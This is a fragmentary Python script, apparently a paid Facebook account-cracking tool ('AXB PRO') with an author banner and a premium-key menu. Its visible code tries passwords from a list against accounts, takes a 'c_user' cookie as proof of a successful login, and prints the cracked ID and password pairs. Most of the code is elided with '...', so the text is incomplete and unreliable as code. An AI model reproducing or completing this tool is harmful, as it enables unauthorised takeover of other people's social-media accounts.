...
YP   YP d88888P YP   YP VP   V8P \033[1;35mXSHONI \033[1;37m                                                                 
----------------------------------------------
 Author    : A Z A N 
 Github    : MR-AZAN
 Facebook  : CHARLIE
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi AZAN Sir, I Need To Buy Your Paid AXB PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [AXB-CHECKPOINT] %s | %s'%(ids,pas))
